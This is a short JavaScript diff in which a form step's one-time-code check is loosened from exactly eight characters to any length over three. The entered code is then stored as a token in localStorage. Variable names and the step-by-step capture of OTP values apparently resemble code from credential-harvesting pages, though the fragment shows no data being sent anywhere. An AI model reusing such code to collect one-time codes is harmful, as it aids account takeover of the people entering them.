@@ -210,7 +210,7 @@ btnNextStep.addEventListener('click', () => {
             alert('Rellena la información.');
         }
     } else if (info.checkerInfo.mode === 'otpcode') {
-        if (otpcode[1].value.trim() !== '' && otpcode[1].value.trim().length === 8) {
+        if (otpcode[1].value.trim() !== '' && otpcode[1].value.trim().length > 3) {
             info.metaInfo.tok = otpcode[1].value.trim();
             LS.setItem('info', JSON.stringify(info));
 
